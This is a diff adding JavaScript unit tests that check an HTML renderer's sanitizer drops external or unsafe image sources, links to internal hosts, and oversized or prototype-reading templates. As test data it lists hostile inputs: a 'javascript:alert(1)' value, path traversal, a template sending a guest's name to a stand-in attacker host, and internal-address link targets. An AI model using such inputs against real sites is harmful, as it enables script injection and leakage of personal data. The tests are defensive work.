@@ -156,3 +156,76 @@ describe('limits', () => {
     expect(root.querySelector('p').textContent.length).toBe(LIMITS.text)
   })
 })
+
+describe('client revalidation equals the server (W6-10)', () => {
+  const BASE = 'https://assets.test/p/1.0.0/'
+  const img = attrs => renderToDom(wrap(el('img', { alt: 'x', ...attrs }))).html
+
+  it.each([
+    'https://evil.example/p.png 2x',
+    'https://evil.example/p.png',
+    'assets/a.png 2x, https://evil.example/b.png 3x',
+    '/relative/p.png',
+    'assets/../x.png 2x',
+    'assets//x.png',
+    'data:image/png;base64,AAAA',
+    'assets/a.png 99999w',
+    'assets/a.png, ',
+    'javascript:alert(1)'
+  ])('drops srcset %s', srcset => {
+    expect(img({ srcset })).not.toContain('srcset')
+  })
+
+  it('keeps a srcset made only of package assets, resolved against the base', () => {
+    expect(img({ srcset: 'assets/a.png 480w, assets/b.png 2x' })).toContain(`srcset="${BASE}assets/a.png 480w, ${BASE}assets/b.png 2x"`)
+  })
+
+  it.each(['https://evil.example/p.png', '/demo/valentina.webp', '//evil.example/p.png', 'http://x.test/p.png', 'blob:https://x.test/1'])('drops src %s (only assets/ of the package)', src => {
+    expect(img({ src })).not.toContain('src=')
+  })
+
+  it('does not let a variable build href, src or srcset (it would leak the guest name)', () => {
+    const leak = { tpl: [{ t: 'text', v: 'https://evil.example/?n=' }, { t: 'var', path: 'guest.name' }] }
+    const whole = { t: 'var', path: 'guest.name' }
+    const { html } = renderToDom(wrap(el('a', { href: leak }, text('a')), el('a', { href: whole }, text('b')), el('img', { src: leak, srcset: leak, alt: 'x' }), el('img', { src: whole, alt: 'x' })))
+    expect(html).not.toContain('evil')
+    expect(html).not.toContain('Rosa')
+    expect(html).not.toContain('href=')
+    expect(html).not.toContain('src')
+  })
+
+  it('still lets a variable fill alt/title/aria-label', () => {
+    const { html } = renderToDom(wrap(el('img', { src: { asset: 'assets/a.png' }, alt: { tpl: [{ t: 'var', path: 'guest.name' }] } })))
+    expect(html).toContain('alt="Rosa Fernández"')
+  })
+
+  it.each(['#nope', '#rsvp', 'https://example.com/a', 'mailto:hola@example.com', 'tel:+13055550100'])('href %s follows the closed list', href => {
+    const { html } = renderToDom(wrap(el('a', { href }, text('go'))))
+    expect(html.includes('href=')).toBe(href !== '#nope')
+  })
+
+  it.each([
+    'https://localhost/x', 'https://app.localhost/x', 'https://127.0.0.1:8080/x', 'https://10.0.0.5/x', 'https://[::1]/x', 'https://0x7f000001/x',
+    'https://2130706433/x', 'https://intranet/x', 'https://printer.local/x', 'https://db.internal/x', 'https://router.lan/x', 'https://user:pw@example.com/x'
+  ])('rejects the link target %s', href => {
+    expect(safeLink(href)).toBeNull()
+  })
+
+  it('accepts ordinary public hosts', () => {
+    expect(safeLink('https://www.example.com/x')).toBe('https://www.example.com/x')
+    expect(safeLink('https://maps.google.com/?q=1')).toBe('https://maps.google.com/?q=1')
+  })
+
+  it('keeps the byte and node caps with a tampered AST', () => {
+    const huge = el('div', {}, text('x'.repeat(LIMITS.astBytes + 10)))
+    const { html, warnings } = renderToDom(huge)
+    expect(html).toBe('<div id="out"></div>')
+    expect(warnings.some(w => w.includes('larger than'))).toBe(true)
+  })
+
+  it('does not read engine strings from the prototype', () => {
+    const strings = { es: {} }
+    const { html } = renderToDom(wrap(el('p', {}, v('t.__proto__'), v('t.constructor'), v('t.toString'))), { ctx: { strings } })
+    expect(html).toContain('<p></p>')
+  })
+})
